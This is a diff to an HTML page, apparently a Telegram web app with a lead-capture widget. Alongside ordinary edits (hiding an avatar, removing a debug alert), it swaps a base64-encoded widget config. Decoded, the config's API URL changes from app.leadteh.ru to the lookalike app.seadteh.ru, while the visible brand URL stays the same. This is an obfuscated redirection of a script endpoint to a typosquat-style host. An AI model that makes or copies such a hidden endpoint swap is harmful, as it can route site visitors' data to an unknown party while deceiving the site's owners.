@@ -45,6 +45,7 @@
             border-radius: 50%;
             width: 50px;
             height: 50px;
+            display: none; /* Скрываем изображение по умолчанию */
         }
     </style>
 </head>
@@ -63,7 +64,7 @@
     <script type="text/javascript">
         (function(w,d,s,l){
             w[l]=w[l]||[];
-            w[l].push({'c':'eyJhcGlVcmwiOiJodHRwczovL2FwcC5sZWFkdGVoLnJ1L2FwaS93aWRnZXQvYTM2ZDQyMzctOTVjOC00MWYzLTkxNzYtZWQyNGFmZmRkMGQyIiwiYnJhbmQiOnsibmFtZSI6IkxFQURURVgiLCJ1cmwiOiJodHRwczovL2xlYWR0ZWgucnUifX0='});
+            w[l].push({'c':'eyJhcGlVcmwiOiJodHRwczovL2FwcC5zZWFkdGVoLnJ1L2FwaS93aWRnZXQvYTM2ZDQyMzctOTVjOC00MWYzLTkxNzYtZWQyNGFmZmRkMGQyIiwiYnJhbmQiOnsibmFtZSI6IkxFQURURVgiLCJ1cmwiOiJodHRwczovL2xlYWR0ZWgucnUifX0='});
             var f=d.getElementsByTagName(s)[0],
                 j=d.createElement(s);
             j.async=true;
@@ -83,9 +84,6 @@
             var userId = user.id;
             var username = user.username;
             var avatarUrl = user.photo_url;
-
-            // Выводим все данные пользователя во всплывающее окно для диагностики
-            alert("User Data: " + JSON.stringify(user));
 
             if (avatarUrl) {
                 var userAvatarElem = document.getElementById('userAvatar');
